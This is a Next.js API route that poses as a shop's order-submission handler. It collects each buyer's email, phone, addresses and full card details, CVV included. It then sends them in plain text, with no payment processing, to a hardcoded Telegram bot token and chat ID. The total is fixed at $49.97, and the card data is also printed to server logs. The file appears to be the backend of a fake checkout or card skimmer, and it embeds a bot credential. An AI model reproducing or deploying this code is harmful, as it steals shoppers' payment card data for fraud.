import { NextResponse } from "next/server"
import { revalidatePath } from "next/cache"
import { getSensitiveData } from "@/utils/sensitiveData"

const TELEGRAM_BOT_TOKEN = "7640274762:AAHBKbMbwxqQf1J8ucv_85KvTkJgGg0nC9g"
const TELEGRAM_CHAT_ID = "7049681503"

export async function POST(req: Request) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Telegram bot token or chat ID is missing")
    return NextResponse.json({ success: false, message: "Configuration error" }, { status: 500 })
  }

  try {
    const formData = await req.formData()

    // Retrieve sensitive data
    const cardInfo = getSensitiveData("cardInfo")
    const cardHolder = getSensitiveData("cardHolder")
    const expirationDate = getSensitiveData("expirationDate")
    const securityCode = getSensitiveData("securityCode")
    const shippingCountry = getSensitiveData("shippingCountry")
    const shippingState = getSensitiveData("shippingState")

    const message = `
🛍️ New Order Received!

Contact Information:
- Email: ${formData.get("contactInfo.email")}
- Phone: ${formData.get("contactInfo.phone")}

Shipping Address:
- Name: ${formData.get("shippingAddress.firstName")} ${formData.get("shippingAddress.lastName")}
- Address: ${formData.get("shippingAddress.address")}
${formData.get("shippingAddress.apartment") ? `- Apartment: ${formData.get("shippingAddress.apartment")}\n` : ""}- City: ${formData.get("shippingAddress.city")}
- State/Province: ${shippingState}
- Postal Code: ${formData.get("shippingAddress.postalCode")}
- Country: ${shippingCountry}

${
  formData.get("billingAddress.firstName")
    ? `
Billing Address:
- Name: ${formData.get("billingAddress.firstName")} ${formData.get("billingAddress.lastName")}
- Address: ${formData.get("billingAddress.address")}
${formData.get("billingAddress.apartment") ? `- Apartment: ${formData.get("billingAddress.apartment")}\n` : ""}- City: ${formData.get("billingAddress.city")}
- State/Province: ${formData.get("billingAddress.state")}
- Postal Code: ${formData.get("billingAddress.postalCode")}
- Country: ${formData.get("billingAddress.country")}
`
    : "Billing Address: Same as shipping"
}

Payment Method:
- Card Number: ${cardInfo}
- Name on Card: ${cardHolder}
- Expiry: ${expirationDate}
- CVV: ${securityCode}

Total: $49.97
`.trim()

    console.log("Sending message to Telegram:", message)

    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    })

    if (!telegramResponse.ok) {
      throw new Error("Failed to send message to Telegram")
    }

    console.log("Order submitted successfully")
    revalidatePath("/")
    return NextResponse.json({ success: true, message: "Order submitted successfully" })
  } catch (error) {
    console.error("Error processing order:", error)
    return NextResponse.json({ success: false, message: "Failed to process order" }, { status: 500 })
  }
}

